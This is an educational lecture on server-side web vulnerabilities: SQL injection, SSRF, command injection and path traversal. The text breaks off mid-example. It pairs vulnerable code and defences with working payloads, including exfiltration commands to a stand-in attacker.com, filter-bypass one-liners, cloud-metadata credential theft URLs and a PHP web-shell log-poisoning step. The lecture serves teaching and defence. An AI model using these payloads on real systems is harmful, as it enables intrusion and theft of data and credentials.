# Server Side Vulnerabilities

Server-side vulnerabilities are among the most severe security issues in web applications. Unlike client-side attacks that execute in the user's browser, server-side vulnerabilities directly compromise the application server, database, or backend systems. These vulnerabilities can lead to complete system compromise, data breaches, and severe business impact.

This lecture covers the major server-side vulnerability classes.

---

## Table of Contents

1. [SQL Injection (SQLi)](#sql-injection-sqli)
2. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
3. [Command Injection](#command-injection)
4. [Path Traversal and File Inclusion](#path-traversal-and-file-inclusion)
5. [XML External Entity (XXE)](#xml-external-entity-xxe)
6. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
7. [Insecure Deserialization](#insecure-deserialization)
8. [Authentication and Authorization Flaws](#authentication-and-authorization-flaws)

---

## SQL Injection (SQLi)

![SQLi Cover](images/sqli_cover.png)

SQL injection (SQLi) is a critical web security vulnerability that enables attackers to manipulate the database queries made by an application. By injecting malicious SQL code into application inputs, attackers can bypass authentication, extract sensitive data, modify or delete records, and in some cases achieve remote code execution on the database server.

SQLi is still among the most common web vulnerabilities and appears consistently in the OWASP Top 10.

### Why SQL Injection Occurs

SQL injection vulnerabilities arise when:

1. **Dynamic SQL Construction**: Application concatenates user input directly into SQL queries
2. **Insufficient Input Validation**: User input is not properly sanitized or validated
3. **Lack of Parameterization**: Queries don't use prepared statements or parameterized queries
4. **Error Message Disclosure**: Detailed database errors are shown to users, aiding exploitation

### Impact of SQL Injections

1. **Data Manipulation**: Attackers can tamper with existing data, potentially altering, deleting, or inserting new records.

2. **Identity Spoofing**: Attackers can gain unauthorized access by pretending to be someone else, potentially leading to unauthorized transactions and actions.

3. **Data Disclosure**: Entire databases can be exposed, leading to theft of sensitive information like user details, financial records, personal messages, etc.

4. **Data Destruction**: Databases can be destroyed or rendered unavailable, disrupting business operations and causing financial losses.

5. **Admin Rights**: Attackers can potentially gain administrative rights to the database server, giving them unrestricted access and control.

6. **Remote Code Execution**: In some database configurations (e.g., `xp_cmdshell` in SQL Server), attackers can execute operating system commands.

7. **Compliance Violations**: Data breaches via SQLi can result in GDPR, HIPAA, PCI-DSS violations with severe financial penalties.

### Basic SQL Injection Example

#### Vulnerable Login Code

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// VULNERABLE: Direct string concatenation
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    // User authenticated
    echo "Login successful!";
} else {
    echo "Invalid credentials";
}
?>
```

#### Attack Example

An attacker enters:

```none
Username: admin' --
Password: [anything]
```

Resulting in the SQL query:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='[anything]';
```

The `--` is a SQL comment marker. Everything after it is ignored, so the password check is bypassed!

**Result**: The attacker logs in as 'admin' without knowing the password.

> **Note**: The login snippets in this lecture compare passwords as plain text to keep the injection itself readable. Real applications must store a password hash (bcrypt, scrypt, Argon2) and verify it in application code, never compare passwords inside the SQL query.

---

### Types of SQL Injection

Which technique applies is decided by what the application gives back.
The observable behaviour selects the attack:

```text
  Inject a probe  ->  what does the application do?
  -----------------------------------------------------------
  Query results rendered on the page
      -> UNION-based: align the column count, then SELECT data
  Database error text shown to the user
      -> Error-based: force data into the error message
  No output, but content changes (found / not found)
      -> Boolean blind: yes/no questions, one bit per request
  No output, no visible difference
      -> Time blind: branch on SLEEP(), measure response time
  No difference at all, but outbound traffic is allowed
      -> Out-of-band: push data out over DNS or HTTP
```

#### 1. Union-Based SQLi

**Union-based SQLi** exploits the SQL `UNION` operator to combine results from the injected query with the original query, allowing attackers to extract data from other tables.

**Requirements**:

- Number of columns must match
- Data types must be compatible

**Example Attack**:

```sql
-- Original query
SELECT product_name, description FROM products WHERE id = 1

-- Injected payload
1' UNION SELECT username, password FROM users --

-- Final query
SELECT product_name, description FROM products WHERE id = '1'
UNION SELECT username, password FROM users --'
```

**Exploitation Steps**:

1. **Determine number of columns**:

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--  (error = 2 columns)
   ```

2. **Find which columns accept string data**:

   ```sql
   ' UNION SELECT 'a', 'b'--
   ```

3. **Extract data**:

   ```sql
   ' UNION SELECT username, password FROM users--
   ' UNION SELECT table_name, NULL FROM information_schema.tables--
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
   ```

#### 2. Boolean-Based Blind SQLi

When the application doesn't display database errors or query results, but behaves differently based on whether the injected condition is true or false.

**Example Scenario**:

```php
// Vulnerable code
$query = "SELECT * FROM products WHERE id = '$id'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Product found";
} else {
    echo "Product not found";
}
```

**Attack Payloads**:

```sql
-- Test if first character of database name is 'a'
1' AND SUBSTRING(DATABASE(),1,1)='a'--

-- True: "Product found"
-- False: "Product not found"

-- Extract database name character by character
1' AND SUBSTRING(DATABASE(),1,1)='s'--
1' AND SUBSTRING(DATABASE(),2,1)='h'--
1' AND SUBSTRING(DATABASE(),3,1)='o'--
```

**Automation with Python**:

```python
import requests

def extract_database_name():
    database_name = ""
    for position in range(1, 50):
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789_':
            payload = f"1' AND SUBSTRING(DATABASE(),{position},1)='{char}'--"
            response = requests.get(f"https://target.com/product?id={payload}")

            if "Product found" in response.text:
                database_name += char
                print(f"Database name so far: {database_name}")
                break
        else:
            # No match found, end of database name
            break

    return database_name
```

#### 3. Time-Based Blind SQLi

When the application shows no visible difference between true and false conditions, attackers can use time delays to infer information.

**Example Payloads**:

```sql
-- MySQL
1' AND IF(SUBSTRING(DATABASE(),1,1)='s', SLEEP(5), 0)--

-- PostgreSQL
1'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Microsoft SQL Server
1'; IF (SUBSTRING(DB_NAME(),1,1)='s') WAITFOR DELAY '00:00:05'--

-- Oracle
1' AND (SELECT CASE WHEN (SUBSTR(user,1,1)='S') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual) IS NULL--
```

**Attack Logic**:

- If the condition is TRUE → Response delayed by 5 seconds
- If the condition is FALSE → Response is immediate

#### 4. Error-Based SQLi

Exploits verbose database error messages to extract data directly from error output.

**Example Attack (MySQL)**:

```sql
-- Extract database name via error message
1' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))--

-- Error output:
-- XPATH syntax error: '~database_name~'

-- Extract table names
1' AND extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
  WHERE table_schema=database()), 0x7e))--

-- Extract user credentials
1' AND extractvalue(1, concat(0x7e, (SELECT CONCAT(username,':',password) FROM users LIMIT 1), 0x7e))--
```

**Example Attack (PostgreSQL)**:

```sql
-- Cast to integer to trigger error with data
1' AND 1=CAST((SELECT version()) AS int)--

-- Error: invalid input syntax for integer: "PostgreSQL 13.2..."
```

#### 5. Out-of-Band SQLi

When in-band techniques don't work, attackers can use out-of-band channels (DNS, HTTP) to exfiltrate data.

**DNS Exfiltration (MySQL)**:

```sql
-- Requires LOAD_FILE() and DNS resolution
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\abc'))--
```

When the database tries to load the file, it makes a DNS request to:

```text
p@ssw0rd123.attacker.com
```

The attacker captures this DNS query on their authoritative DNS server.

**HTTP Exfiltration (Microsoft SQL Server)**:

```sql
1'; EXEC master..xp_dirtree '\\attacker.com\' + (SELECT password FROM users WHERE username='admin') + '\abc'--
```

#### 6. NoSQL Injection

NoSQL databases (MongoDB, CouchDB, etc.) are also vulnerable to injection attacks.

**MongoDB Example**:

Vulnerable Node.js code:

```javascript
// VULNERABLE
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    db.collection('users').findOne({
        username: username,
        password: password
    }, (err, user) => {
        if (user) {
            res.send('Login successful');
        } else {
            res.send('Invalid credentials');
        }
    });
});
```

**Attack Payload**:

```json
POST /login
Content-Type: application/json

{
    "username": "admin",
    "password": {"$ne": null}
}
```

This query becomes:

```javascript
{
    username: "admin",
    password: {$ne: null}  // Not equal to null = any password
}
```

**Result**: Authentication bypass

**Additional NoSQL Injection Operators**:

- `$gt`, `$gte` - Greater than (equal)
- `$lt`, `$lte` - Less than (equal)
- `$ne` - Not equal
- `$regex` - Regular expression matching
- `$where` - JavaScript expression evaluation (dangerous!)

**Example with $where**:

`$where` is a top-level query operator, not a field operator, and the
expression it holds is evaluated as JavaScript by the server:

```json
{
    "$where": "sleep(5000)"
}
```

---

### SQL Injection Prevention

#### 1. Parameterized Queries (Prepared Statements)

**The most effective defense against SQL injection.**

**PHP (PDO)**:

```php
<?php
// SECURE: Parameterized query
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
?>
```

**Python (psycopg2)**:

```python
# SECURE
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
               (username, password))
```

**Java (JDBC)**:

```java
// SECURE
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**Node.js (MySQL)**:

```javascript
// SECURE
connection.query('SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password],
    (error, results) => {
        // Handle results
    }
);
```

#### 2. Object-Relational Mapping (ORM)

**Using ORM frameworks** that abstract SQL queries:

**Django (Python)**:

```python
# SECURE
user = User.objects.get(username=username, password=password)
```

**Sequelize (Node.js)**:

```javascript
// SECURE
const user = await User.findOne({
    where: {
        username: username,
        password: password
    }
});
```

**Entity Framework (C#)**:

```csharp
// SECURE
var user = dbContext.Users
    .Where(u => u.Username == username && u.Password == password)
    .FirstOrDefault();
```

#### 3. Input Validation and Sanitization

**Whitelist approach** (preferred):

```php
// Validate numeric input
if (!is_numeric($id)) {
    die("Invalid input");
}

// Validate against allowed values
$allowed_columns = ['name', 'email', 'created_at'];
if (!in_array($sort_column, $allowed_columns)) {
    die("Invalid column");
}
```

**Escaping** (less secure than parameterization, but better than nothing):

```php
// MySQL
$username = mysqli_real_escape_string($conn, $username);

// PostgreSQL
$username = pg_escape_string($username);
```

⚠️ **Warning**: Escaping is NOT sufficient on its own. Always prefer parameterized queries.

#### 4. Least Privilege Principle

Database user accounts should have minimal necessary permissions:

```sql
-- Create limited user for application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'webapp'@'localhost';

-- DO NOT grant:
-- - DROP, CREATE, ALTER (structure modification)
-- - FILE (file system access)
-- - SUPER, PROCESS (administrative functions)
```

#### 5. Web Application Firewall (WAF)

Deploy a WAF to detect and block SQL injection attempts:

- **ModSecurity** (open-source)
- **Cloudflare WAF**
- **AWS WAF**
- **Azure WAF**

**ModSecurity Rule Example**:

```apache
SecRule ARGS "@detectSQLi" "id:1,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

#### 6. Error Handling

**Never expose database errors to users**:

```php
// BAD - Exposes database structure
mysqli_query($conn, $query) or die(mysqli_error($conn));

// GOOD - Generic error message
if (!mysqli_query($conn, $query)) {
    error_log("Database error: " . mysqli_error($conn));
    die("An error occurred. Please try again later.");
}
```

#### 7. Security Testing

- **Static Analysis**: Use tools like SonarQube, Checkmarx to detect SQLi in code
- **Dynamic Analysis**: Use tools like SQLmap, Burp Suite to test running applications
- **Penetration Testing**: Regular security assessments

**SQLmap Example**:

```bash
# Test a URL parameter for SQL injection
sqlmap -u "http://target.com/product?id=1" --batch --dbs

# Extract database tables
sqlmap -u "http://target.com/product?id=1" -D database_name --tables

# Dump user credentials
sqlmap -u "http://target.com/product?id=1" -D database_name -T users --dump
```

---

### SQL Injection Detection

**Indicators of SQL Injection Attempts**:

1. **Web Application Firewall Logs**:
   - Requests containing SQL keywords: `UNION`, `SELECT`, `' OR '`, `--`, `;`
   - Encoded SQL: `%27` ('), `%22` ("), `%23` (#)

2. **Database Logs**:
   - Unusual query patterns
   - Queries accessing `information_schema`
   - Multiple failed authentication attempts with SQL syntax

3. **Application Logs**:
   - Increased database errors
   - Unexpected query execution times

**Log Analysis Example**:

```bash
# Search web server logs for SQLi patterns
grep -E "(UNION|SELECT|' OR|information_schema|extractvalue)" /var/log/apache2/access.log

# Find time-based SQLi attempts
grep -E "(SLEEP|WAITFOR|pg_sleep|DBMS_PIPE)" /var/log/apache2/access.log
```

> **For more Examples see:** <https://portswigger.net/web-security/sql-injection#sql-injection-examples>

---

## Server-Side Request Forgery (SSRF)

Server-side request forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can include internal services, cloud metadata endpoints, or external systems.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.

### Why SSRF Occurs

SSRF vulnerabilities arise when:

1. **Unsanitized URLs**: Application accepts user-supplied URLs without validation
2. **File Upload Features**: File processing that fetches external resources (e.g., PDF generators)
3. **Webhooks**: Applications that fetch data from user-provided webhook URLs
4. **API Integration**: Features that proxy requests to third-party APIs
5. **Image/Document Processing**: Features that load remote images or documents

### Impact of SSRF Attacks

1. **Unauthorized Access**: SSRF attacks can bypass access controls, potentially leading to unauthorized actions or data access within internal systems.

2. **Data Exfiltration**: Sensitive data from the server or connected backend systems can be accessed, which may include personal, credential, or confidential information.

3. **Cloud Metadata Access**: In cloud environments, SSRF can access instance metadata endpoints (AWS, Azure, GCP) to steal credentials and secrets.

4. **Internal Probing**: SSRF can be utilized to map internal networks, discover services on other machines, and identify further vulnerabilities within an internal network.

5. **Arbitrary Command Execution**: Some SSRF vulnerabilities may lead to remote code execution, allowing attackers to run arbitrary commands on the server or related systems.

6. **Secondary Attacks**: The server can be manipulated to make requests to external systems, leading to secondary attacks that appear to come from the organization itself.

7. **Denial of Service**: SSRF attacks can result in service overload, potentially leading to denial of service for internal services.

---

### Basic SSRF Example

**Vulnerable Code**:

```php
<?php
// VULNERABLE: Fetches URL provided by user
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
?>
```

**Attack Example**:

```url
https://vulnerable-website.com/fetch?url=http://localhost/admin
```

The server makes a request to its own `localhost/admin` endpoint, which might be:

- Not accessible from the internet
- Protected by IP-based access controls
- Containing sensitive administrative functions

**Result**: The attacker can access internal services that should not be publicly accessible.

The reason SSRF works is positional: the request is made by a host that
already sits inside the trusted network.

```text
  +-- internet ----+    +-- internal network ------------------+
  |                |    |                                      |
  |  Attacker -----+---->  Web app --+--> 10.0.0.5     admin UI |
  |   supplies a   |    |  fetches   +--> 127.0.0.1    local    |
  |   URL it can   |    |  the URL   |                  only    |
  |   not reach    |    |  for the   +--> 169.254.169.254 IMDS  |
  |   itself       |    |  attacker  +--> redis, memcached, ... |
  |                |    |                                      |
  +----------------+    +--------------------------------------+

  The app's source IP is trusted, so internal ACLs let it through.
```

---

### SSRF Attack Scenarios

#### 1. Accessing Internal Services

**Target**: Internal admin panel at `http://192.168.1.10/admin`

```url
https://vulnerable.com/fetch?url=http://192.168.1.10/admin
```

**Why it works**: The application server is inside the corporate network and can access internal IPs that are not routable from the internet.

#### 2. Cloud Metadata Endpoints

Cloud providers expose instance metadata at special IP addresses. SSRF can be used to steal cloud credentials.

**AWS Metadata Endpoint**:

```url
https://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```

**Response**:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2025-11-11T12:00:00Z"
}
```

**Azure Metadata Endpoint**:

```url
https://vulnerable.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**GCP Metadata Endpoint**:

```url
https://vulnerable.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### 3. Port Scanning Internal Network

**Attack**: Use SSRF to scan internal network ports

```python
import requests

for port in range(1, 1000):
    url = f"https://vulnerable.com/fetch?url=http://192.168.1.10:{port}"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code != 500:
            print(f"Port {port} is open")
    except:
        pass
```

#### 4. Bypassing Authentication

**Scenario**: Admin panel accessible only from localhost

Normal request from internet:

```text
https://vulnerable.com/admin
→ 403 Forbidden (IP not whitelisted)
```

SSRF attack:

```text
https://vulnerable.com/fetch?url=http://localhost/admin
→ 200 OK (request appears to come from localhost)
```

#### 5. Reading Local Files (using file:// protocol)

```url
https://vulnerable.com/fetch?url=file:///etc/passwd
```

**Response**:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

### SSRF Bypass Techniques

Defenders often implement filters to prevent SSRF. Here are common bypass techniques:

#### 1. Alternative IP Encoding

**Decimal encoding**:

```url
http://2130706433/  (127.0.0.1 in decimal)
```

**Hexadecimal encoding**:

```url
http://0x7f000001/  (127.0.0.1 in hex)
```

**Octal encoding**:

```url
http://0177.0.0.1/  (127.0.0.1 with first octet in octal)
```

**Integer encoding**:

```url
http://2852039166/  (169.254.169.254 in integer)
```

#### 2. DNS Rebinding

**Attack Flow**:

1. Attacker controls `evil.com` DNS server
2. First DNS query returns legitimate IP (e.g., `1.2.3.4`)
3. Application validates the IP is not internal
4. Application makes request to `evil.com`
5. Second DNS query (with short TTL) returns internal IP (e.g., `192.168.1.10`)
6. Request goes to internal service

**DNS Configuration**:

```text
evil.com. 1 IN A 1.2.3.4
evil.com. 1 IN A 192.168.1.10
```

#### 3. URL Parser Confusion

Different URL parsers may interpret URLs differently.

```text
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://evil.com#@127.0.0.1/
```

Some parsers interpret `@` as authentication credentials, others as part of the hostname.

#### 4. Redirect-Based SSRF

If the application follows redirects:

1. Attacker provides: `https://evil.com/redirect`
2. Application validates: `evil.com` is allowed
3. `evil.com/redirect` returns HTTP 302 to `http://169.254.169.254/...`
4. Application follows redirect to metadata endpoint

**Evil server code**:

```php
<?php
header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/');
?>
```

#### 5. Protocol Smuggling

Use alternative protocols if not properly filtered:

```text
dict://localhost:11211/stat
gopher://localhost:6379/_SET key value
sftp://localhost:22/
ldap://localhost:389/
```

**Gopher Protocol Example** (Redis exploitation):

```text
gopher://localhost:6379/_FLUSHALL
gopher://localhost:6379/_SET%20mykey%20myvalue
```

#### 6. IPv6 Localhost

```url
http://[::1]/admin
http://[0000::1]/admin
```

#### 7. CIDR Bypass

If blacklist blocks `127.0.0.0/8`:

```url
http://127.1/admin  (interpreted as 127.0.0.1)
http://127.0.1/admin
```

---

### Blind SSRF

When the application doesn't return the response to the attacker, but still makes the request.

**Detection Methods**:

#### 1. Out-of-Band (OOB) Interaction

Use external services to detect SSRF:

```url
https://vulnerable.com/fetch?url=http://burpcollaborator.net
```

Monitor for:

- DNS queries to `burpcollaborator.net`
- HTTP requests to your server

#### 2. Time-Based Detection

Internal services respond faster than external:

```text
https://vulnerable.com/fetch?url=http://192.168.1.10:80  (fast response)
https://vulnerable.com/fetch?url=http://192.168.1.10:9999  (timeout/slow)
```

Measure response time to infer port status.

---

### SSRF Prevention

#### 1. Whitelist Allowed Destinations

```php
<?php
$allowed_domains = ['api.example.com', 'cdn.example.com'];
$url = $_GET['url'];

$parsed = parse_url($url);
if (!in_array($parsed['host'], $allowed_domains)) {
    die("URL not allowed");
}

$content = file_get_contents($url);
?>
```

#### 2. Disable Unused URL Schemes

```php
<?php
$url = $_GET['url'];

// Only allow HTTP and HTTPS
if (!preg_match('/^https?:\/\//', $url)) {
    die("Invalid protocol");
}

// Disable dangerous stream wrappers
stream_wrapper_unregister('file');
stream_wrapper_unregister('ftp');
stream_wrapper_unregister('php');
stream_wrapper_unregister('data');

$content = file_get_contents($url);
?>
```

#### 3. Block Internal IP Ranges

```python
import ipaddress
import urllib.parse

def is_internal_ip(url):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname

    try:
        ip = ipaddress.ip_address(hostname)

        # Block private IP ranges
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return True

        # Block cloud metadata IPs
        if str(ip) == '169.254.169.254':
            return True

        return False
    except ValueError:
        # Hostname is domain, need DNS resolution
        # Resolve and check IP before making request
        pass

url = request.GET['url']
if is_internal_ip(url):
    return "Internal IPs not allowed"
```

⚠️ **Warning**: Checking IPs is complex due to DNS rebinding, TOCTOU (Time-of-Check-Time-of-Use), and encoding bypasses.

#### 4. Use Network Segmentation

- Place application servers in a DMZ (Demilitarized Zone)
- Restrict outbound connections from application servers
- Use firewall rules to block access to metadata endpoints

**Firewall Rule (iptables)**:

```bash
# Block access to cloud metadata endpoint
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block access to private IP ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

#### 5. Disable HTTP Redirects

```python
import requests

url = user_input
# Don't follow redirects
response = requests.get(url, allow_redirects=False)
```

#### 6. IMDSv2 (AWS)

AWS IMDSv2 requires a session token, making SSRF exploitation harder:

```bash
# IMDSv1 (vulnerable to SSRF)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (requires PUT request first)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

Configure instances to require IMDSv2:

```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

#### 7. Response Validation

Even if request is made, don't return raw response to user:

```python
def fetch_url(url):
    if not is_safe_url(url):
        raise Exception("Unsafe URL")

    response = requests.get(url, timeout=5)

    # Don't return raw response
    # Parse and validate expected format
    try:
        data = response.json()
        # Only return expected fields
        return {
            'title': data.get('title'),
            'description': data.get('description')
        }
    except:
        return "Invalid response format"
```

---

### SSRF Detection and Monitoring

**Indicators of SSRF Attacks**:

1. **Unusual Outbound Connections**:
   - Requests to internal IPs
   - Connections to cloud metadata endpoints
   - Requests to localhost

2. **Access Logs**:
   - URL parameters containing IPs or internal hostnames
   - Requests with unusual protocols (gopher, dict, file)

3. **Network Monitoring**:
   - Monitor DNS queries for internal domain names from application servers
   - Alert on connections to 169.254.169.254

**Log Analysis**:

```bash
# Search for SSRF attempts in access logs
grep -E "(localhost|127\.0\.0\.1|192\.168\.|10\.|169\.254\.169\.254)" /var/log/apache2/access.log

# Find requests with file:// or other dangerous protocols
grep -E "(file://|dict://|gopher://|sftp://)" /var/log/apache2/access.log
```

---

## Command Injection

Command injection (also known as OS command injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server running the application. This typically occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers) to a system shell.

### Why Command Injection Occurs

1. **Unsafe Use of System Commands**: Application executes system commands with user input
2. **Insufficient Input Validation**: User input not properly sanitized before being passed to shell
3. **Dynamic Command Construction**: String concatenation to build shell commands

### Impact of Command Injection

- **Complete Server Compromise**: Execute arbitrary commands with application privileges
- **Data Exfiltration**: Read sensitive files, database credentials
- **Lateral Movement**: Use compromised server to attack internal network
- **Backdoor Installation**: Install persistent access mechanisms
- **Denial of Service**: Crash services or consume resources

---

### Basic Command Injection Example

**Vulnerable Code**:

```php
<?php
// VULNERABLE: Ping utility
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

**Attack Payload**:

```url
https://vulnerable.com/ping.php?ip=8.8.8.8;cat /etc/passwd
```

**Executed Command**:

```bash
ping -c 4 8.8.8.8;cat /etc/passwd
```

**Result**: The server pings 8.8.8.8 and then executes `cat /etc/passwd`, leaking system user accounts.

---

### Command Injection Techniques

#### 1. Command Separators

Different separators allow executing multiple commands:

```bash
# Semicolon (executes both commands)
; command

# Pipe (passes output to next command)
| command

# AND operator (executes if first succeeds)
&& command

# OR operator (executes if first fails)
|| command

# Newline
%0a command

# Background execution
& command

# Subshell
`command`
$(command)
```

**Examples**:

```bash
8.8.8.8; whoami
8.8.8.8 && cat /etc/passwd
8.8.8.8 | id
8.8.8.8%0Als -la
```

#### 2. Blind Command Injection

When the application doesn't return command output, use out-of-band techniques:

**Time-Based Detection**:

```bash
8.8.8.8 || sleep 10
8.8.8.8 & ping -c 10 127.0.0.1
```

If the response is delayed by 10 seconds, command injection exists.

**DNS Exfiltration**:

```bash
8.8.8.8 || nslookup $(whoami).attacker.com
8.8.8.8 || curl http://$(hostname).attacker.com
```

Monitor DNS queries on `attacker.com` to see the executed command result.

**HTTP Exfiltration**:

```bash
8.8.8.8 || curl http://attacker.com/$(whoami)
8.8.8.8 || wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

#### 3. Bypassing Filters

**Space Filtering Bypass**:

```bash
# Use ${IFS} (Internal Field Separator)
cat${IFS}/etc/passwd

# Use tabs
cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}
```

**Keyword Filtering Bypass**:

```bash
# Concatenation
cat /etc/pas''swd
cat /etc/pass\wd
cat /et'c'/passw'd'

# Variable expansion
CMD=cat; $CMD /etc/passwd

# Wildcard
cat /etc/p*sswd
cat /etc/passw?
```

**Blacklist Bypass**:

```bash
# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh

# Hex encoding
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Command substitution
c'a't /e't'c/p'a's's'w'd'
```

---

### Command Injection Prevention

#### 1. Avoid System Commands Entirely

**Use built-in language functions instead of shell commands:**

```php
// BAD: Using shell command
$files = shell_exec("ls " . $directory);

// GOOD: Using native PHP function
$files = scandir($directory);
```

```python
# BAD: Using shell command
import os
os.system("ls " + directory)

# GOOD: Using native Python
import os
files = os.listdir(directory)
```

#### 2. Input Validation (Whitelist)

```php
<?php
$ip = $_GET['ip'];

// Validate IP address format
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// Now safe to use
$output = shell_exec("ping -c 4 " . escapeshellarg($ip));
?>
```

#### 3. Use Parameterized APIs

```python
import subprocess

ip = user_input

# SECURE: Using array instead of string
result = subprocess.run(['ping', '-c', '4', ip], capture_output=True)

# Shell=False prevents shell injection
# Each argument is passed separately, not concatenated
```

```php
<?php
// Use escapeshellarg() to safely escape arguments
$ip = escapeshellarg($_GET['ip']);
$output = shell_exec("ping -c 4 " . $ip);
?>
```

#### 4. Principle of Least Privilege

Run application with minimal permissions:

```bash
# Create limited user
sudo useradd -r -s /bin/false webapp

# Run application as limited user
sudo -u webapp php app.php
```

#### 5. Disable Dangerous Functions

In `php.ini`:

```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

---

## Path Traversal and File Inclusion

Path traversal (also known as directory traversal) allows attackers to access files and directories stored outside the web root folder. File inclusion vulnerabilities allow attackers to include files into the application, potentially leading to code execution.

### Types of File Inclusion Vulnerabilities

1. **Path Traversal**: Reading arbitrary files
2. **Local File Inclusion (LFI)**: Including local files in execution
3. **Remote File Inclusion (RFI)**: Including remote files in execution

---

### Path Traversal

**Vulnerable Code**:

```php
<?php
// VULNERABLE: File download feature
$file = $_GET['file'];
$content = file_get_contents("/var/www/documents/" . $file);
header('Content-Type: application/pdf');
echo $content;
?>
```

**Attack Payload**:

```url
https://vulnerable.com/download.php?file=../../../etc/passwd
```

**Executed Path**:

```text
/var/www/documents/../../../etc/passwd
→ /etc/passwd
```

**Common Traversal Sequences**:

```text
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd  (filter bypass)
..%252f..%252f..%252fetc/passwd  (double URL encoding)
```

**Sensitive Files to Target**:

**Linux**:

- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes (if readable)
- `/home/user/.ssh/id_rsa` - SSH private keys
- `/var/log/apache2/access.log` - Web server logs
- `/proc/self/environ` - Environment variables (may contain secrets)

**Windows**:

- `C:\windows\system32\config\sam` - Windows password hashes
- `C:\windows\system32\drivers\etc\hosts` - Hosts file
- `C:\inetpub\logs\LogFiles\W3SVC1\` - IIS logs

---

### Local File Inclusion (LFI)

Allows including and executing local files.

**Vulnerable Code**:

```php
<?php
// VULNERABLE: Dynamic page inclusion
$page = $_GET['page'];
include("/var/www/pages/" . $page . ".php");
?>
```

**Attack Payload**:

```url
https://vulnerable.com/index.php?page=../../../../etc/passwd%00
```

The `%00` (null byte) truncates the `.php` extension in some PHP versions < 5.3.4.

**Result**: The content of `/etc/passwd` is included and executed (though it's not PHP code, so it's just displayed).

#### LFI to RCE (Remote Code Execution)

**1. Log Poisoning**:

Attack Flow:

1. Inject PHP code into log file
2. Include log file via LFI
3. Injected PHP code executes

```text
  1. Attacker request   User-Agent: <?php system($_GET['cmd']); ?>
           |
           v
  2. Server log         access.log now contains the PHP tags
           |
           v
  3. LFI include        ?page=../../var/log/apache2/access.log
           |            &cmd=whoami
           v
  4. PHP parses the log file as source  ->  command executed
```

**Example**:

```bash
# Step 1: Inject PHP code into User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://vulnerable.com/

# Step 2: Include log file
